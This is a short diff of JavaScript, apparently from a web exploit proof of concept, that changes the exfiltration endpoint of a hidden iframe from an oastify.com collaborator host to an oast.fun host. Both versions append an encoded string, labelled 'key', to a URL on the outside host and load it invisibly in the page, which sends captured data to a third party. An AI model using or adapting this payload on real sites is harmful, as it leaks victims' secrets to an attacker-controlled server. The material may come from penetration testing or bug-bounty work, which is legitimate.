@@ -58,7 +58,7 @@ function reqListener() {
 
         // Load the iframe
         var iframe = document.createElement('iframe');
-        iframe.src = '//0jkju313fs0ejqhs4mrm2zarrix9lz9o.oastify.com/log?key=' + encodedString;
+        iframe.src = '//bvhnlkcaysjkbvfvgpanasfgyky8iv429.oast.fun/log?key=' + encodedString;
         iframe.style.display = 'none';
         // Append the iframe to the document body
         document.body.appendChild(iframe);
